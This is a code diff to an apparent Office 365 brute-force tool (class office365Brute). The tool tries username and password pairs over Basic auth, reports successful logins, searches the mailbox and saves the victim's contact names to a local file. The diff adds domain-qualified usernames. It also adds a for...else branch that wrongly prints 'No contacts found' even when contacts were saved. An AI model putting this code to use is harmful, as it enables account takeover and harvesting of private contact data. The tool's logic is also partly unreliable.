@@ -48,12 +48,14 @@ class office365Brute():
                                                                                                          'ignore') + ")"
             except:
                 pass
-        print("[+]  Contacts found. Saving to tmp/contacts-" + config["USERNAME"] + "...")
+        print("[+]  Any contacts found will be saved to tmp/contacts-" + config["USERNAME"] + "...")
         for contact in sorted(set(contacts)):
             print("[+]  Contact Name:  " + contact)
-            f = open('tmp/contacts-' + config["USERNAME"] + '.txt', 'a')
+            f = open('./tmp/contacts-' + config["USERNAME"] + '.txt', 'a')
             f.write(contact + '\n')
             f.close()
+        else:
+            print("[-]  No contacts found in mailbox.")
     def buildConn(self, request, user, password, host, url, context):
         # Build authentication string, remove newline for using it in a http header
         auth = base64.encodestring("%s:%s" % (user, password)).replace('\n', '')
@@ -103,9 +105,13 @@ class office365Brute():
         except:
             context = None
             pass
-        (status, data) = self.buildConn(request, config["USERNAME"], config["PASSWORD"], config["HOST"], url, context)
+        if config["domain"]:
+            user = config["domain"] + '\\' + config["USERNAME"]
+        else:
+            user = config["USERNAME"]
+        (status, data) = self.buildConn(request, user, config["PASSWORD"], config["HOST"], url, context)
         if (int(status) == 200):
-            print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
+            print("[+]  User Credentials Successful: " + user + ":" + config["PASSWORD"])
             self.searchMessages(self.term, data, config)
         else:
             print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
